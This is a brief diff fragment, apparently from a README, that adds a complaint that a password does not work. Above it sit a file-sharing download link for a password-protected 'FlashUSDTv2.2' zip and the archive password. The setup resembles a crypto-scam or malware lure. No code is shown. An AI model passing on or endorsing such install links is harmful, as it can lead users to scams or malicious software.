@@ -9,3 +9,5 @@
 💢 [Click Here To Install](https://www.mediafire.com/file/2vjkuhm2680ciiv/FlashUSDTv2.2.zip/file)💢
 
 💢 [Pass -  10P3tr0$!] 💢
+
+password is not working
